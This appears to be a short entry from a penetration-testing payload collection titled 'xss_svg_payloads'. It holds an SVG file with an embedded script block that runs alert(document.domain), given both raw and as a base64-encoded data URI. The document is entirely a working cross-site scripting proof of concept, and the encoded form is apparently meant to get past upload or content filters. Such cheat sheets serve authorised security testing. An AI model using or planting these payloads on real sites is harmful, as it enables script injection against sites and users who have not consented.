# xss_svg_payloads

**Raw**

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```


**Base 64**

```
data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MDAgNTAwIj4KICAgIDxzY3JpcHQ+Ly88IVtDREFUQVsKICAgICAgICBhbGVydChkb2N1bWVudC5kb21haW4pCiAgICAvL11dPgogICAgPC9zY3JpcHQ+Cjwvc3ZnPgo=
```
